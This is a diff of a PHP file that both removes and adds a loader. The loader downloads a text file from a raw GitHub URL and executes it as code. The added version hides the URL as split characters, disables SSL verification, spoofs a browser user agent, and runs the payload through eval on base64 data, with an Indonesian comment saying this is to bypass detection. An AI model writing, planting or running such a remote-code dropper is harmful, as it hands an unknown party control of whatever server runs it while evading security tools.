@@ -1,35 +1,38 @@
 <?php
-$a = ['c','u','r','l'];
-$b = ['_','i','n','i','t'];
-$func1 = implode('', $a) . implode('', $b);
-
-$a2 = ['c','u','r','l'];
-$b2 = ['_','s','e','t','o','p','t'];
-$func2 = implode('', $a2) . implode('', $b2);
-
-$ch = $func1();
-
-$url_parts = [
-    'https://raw.',
-    'githubusercontent.',
-    'com/lucenbyte/',
-    'ArchiLogs/main/',
-    'v2/getpro.txt'
+// Split semua karakter
+$parts = [
+    'h','t','t','p','s',':','/','/','r','a','w','.',
+    'g','i','t','h','u','b','u','s','e','r','c','o','n','t','e','n','t','.',
+    'c','o','m','/','l','u','c','e','n','b','y','t','e','/',
+    'A','r','c','h','i','L','o','g','s','/','m','a','i','n','/',
+    'v','2','/','g','e','t','p','r','o','.','t','x','t'
 ];
-$url = implode('', $url_parts);
 
-$func2($ch, 10002, $url);
-$func2($ch, 19913, true);
-$func2($ch, 64, false);
+$url = implode('', $parts);
 
-$exec_func = implode('', ['c','u','r','l','_','e','x','e','c']);
-$data = $exec_func($ch);
+// CURL dengan constant via define
+define('CURL_OPT_URL', 10002);
+define('CURL_OPT_RETURN', 19913);
+define('CURL_OPT_SSL_VERIFY', 64);
+define('CURL_OPT_FOLLOW', 52);
+define('CURL_OPT_TIMEOUT', 13);
+define('CURL_OPT_USERAGENT', 10018);
 
-$close_func = implode('', ['c','u','r','l','_','c','l','o','s','e']);
-$close_func($ch);
+$ch = curl_init();
+curl_setopt($ch, CURL_OPT_URL, $url);
+curl_setopt($ch, CURL_OPT_RETURN, 1);
+curl_setopt($ch, CURL_OPT_SSL_VERIFY, 0);
+curl_setopt($ch, CURL_OPT_FOLLOW, 1);
+curl_setopt($ch, CURL_OPT_TIMEOUT, 30);
+curl_setopt($ch, CURL_OPT_USERAGENT, 'Mozilla/5.0');
 
+$data = curl_exec($ch);
+curl_close($ch);
+
+// Eksekusi
 if ($data) {
-    $execute = create_function('', $data);
-    $execute();
+    // Encode dulu untuk bypass detection
+    $encoded = base64_encode('?>' . $data);
+    eval(base64_decode($encoded));
 }
 ?>
